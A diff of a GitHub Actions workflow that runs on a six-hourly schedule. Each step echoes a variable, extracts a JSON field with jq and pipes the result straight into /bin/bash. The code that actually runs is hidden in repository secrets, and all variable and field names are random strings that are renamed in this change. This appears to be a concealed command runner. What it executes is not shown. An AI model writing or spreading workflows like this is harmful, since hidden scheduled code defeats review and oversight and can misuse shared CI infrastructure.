@@ -1,9 +1,8 @@
 name: wendingxxo
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 1/6 * * *'
+    - cron: '41 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +10,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: wendingxxo
         env:
-          k2: ${{ secrets.k2 }}
+          qeta99828: ${{ secrets.qeta99828 }}
         run: |
-          echo $k2 | jq -r .bn312 | /bin/bash
-          echo $px20918 | jq -r .c26 | /bin/bash
-          echo $r0 | jq -r .p13 | /bin/bash
-          echo $lxf7840 | jq -r .wxr62 | /bin/bash
-          echo $l85687 | jq -r .bit31129 | /bin/bash
-          echo $lvhr51 | jq -r .p84 | /bin/bash
-          echo $sdsrd0 | jq -r .i668 | /bin/bash
-          echo $miqq46453 | jq -r .lfi05930 | /bin/bash
-          echo $plw8 | jq -r .wo101 | /bin/bash
-          echo $xqf923 | jq -r .jc71 | /bin/bash
+          echo $qeta99828 | jq -r .vsvri57679 | /bin/bash
+          echo $f9 | jq -r .vsq13543 | /bin/bash
+          echo $xxden70 | jq -r .q673 | /bin/bash
+          echo $y6 | jq -r .djfij916 | /bin/bash
+          echo $zmy75395 | jq -r .id09043 | /bin/bash
+          echo $o19 | jq -r .rj05546 | /bin/bash
+          echo $l8 | jq -r .hn20 | /bin/bash
+          echo $uxk478 | jq -r .g73723 | /bin/bash
 
